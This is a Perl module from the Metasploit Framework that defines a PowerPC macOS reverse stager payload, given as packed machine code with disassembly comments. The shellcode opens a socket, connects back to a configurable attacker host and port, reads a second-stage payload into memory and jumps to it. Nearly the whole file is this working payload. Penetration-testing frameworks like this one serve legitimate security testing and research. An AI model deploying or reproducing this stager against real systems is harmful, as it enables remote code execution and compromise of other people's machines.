###############
##
#
#    Name: ReverseStager.pm
# Version: $Revision$
#  Source: src/shellcode/osx/ppc/stager_sock_reverse.asm
# License:
#
#      This file is part of the Metasploit Exploit Framework
#      and is subject to the same licenses and copyrights as
#      the rest of this package.
#
# Descrip:
#
#      PowerPC reverse stager for OSX.
#
##
###############

package Msf::PayloadComponent::OSX::ppc::ReverseStager;

use strict;
use base 'Msf::PayloadComponent::OSX::ReverseStager';

my $info =
{
    'Authors'      => [ 'H D Moore <hdm [at] metasploit.com>', ],
    'Arch'         => [ 'ppc' ],
    'Priv'         => 0,
    'OS'           => [ 'osx' ],
    'Multistage'   => 1,      
    'Size'         => '',
    'Payload' =>
    {   
        Offsets => { 'LPORT' => [34, 'n'], 'LHOST' => [36, 'ADDR'] },   
        Payload =>
		pack("N*",
			 0x38600002,     # 0x1da0 <main>:          li      r3,2
			 0x38800001,     # 0x1da4 <main+4>:        li      r4,1
			 0x38a00006,     # 0x1da8 <main+8>:        li      r5,6
			 0x38000061,     # 0x1dac <main+12>:       li      r0,97
			 0x44000002,     # 0x1db0 <main+16>:       sc
			 0x7c000278,     # 0x1db4 <main+20>:       xor     r0,r0,r0
			 0x7c7e1b78,     # 0x1db8 <main+24>:       mr      r30,r3
			 0x4800000d,     # 0x1dbc <main+28>:       bl      0x1dc8 <konnect>
			 0x00022211,     # 0x1dc0 <main+32>:       .long 0x22211
			 0x7f000001,     # 0x1dc4 <main+36>:       .long 0x7f000001
			 0x7c8802a6,     # 0x1dc8 <konnect>:       mflr    r4
			 0x38a00010,     # 0x1dcc <konnect+4>:     li      r5,16
			 0x38000062,     # 0x1dd0 <konnect+8>:     li      r0,98
			 0x7fc3f378,     # 0x1dd4 <konnect+12>:    mr      r3,r30
			 0x44000002,     # 0x1dd8 <konnect+16>:    sc
			 0x7c000278,     # 0x1ddc <konnect+20>:    xor     r0,r0,r0
			 0x38000003,     # 0x1de4 <reader>:        li      r0,3
			 0x7fc3f378,     # 0x1de8 <reader+4>:      mr      r3,r30
			 0x3881e000,     # 0x1dec <reader+8>:      addi    r4,r1,-8192
			 0x38a02000,     # 0x1df0 <reader+12>:     li      r5,8192
			 0x7c8803a6,     # 0x1df4 <reader+16>:     mtlr    r4
			 0x44000002,     # 0x1df8 <reader+20>:     sc
			 0x7c000278,     # 0x1dfc <reader+24>:     xor     r0,r0,r0
			 0x4e800020,     # 0x1e00 <reader+28>:     blr
			 0x7c000278,     # 0x1e04 <reader+32>:     xor     r0,r0,r0			 
		),
    },
};


sub new
{
	my $class = shift;
	my $hash  = @_ ? shift : { };
	my $self;

	$hash = $class->MergeHashRec($hash, { Info => $info });
	$self = $class->SUPER::new($hash, @_);

	return $self;
}

1;
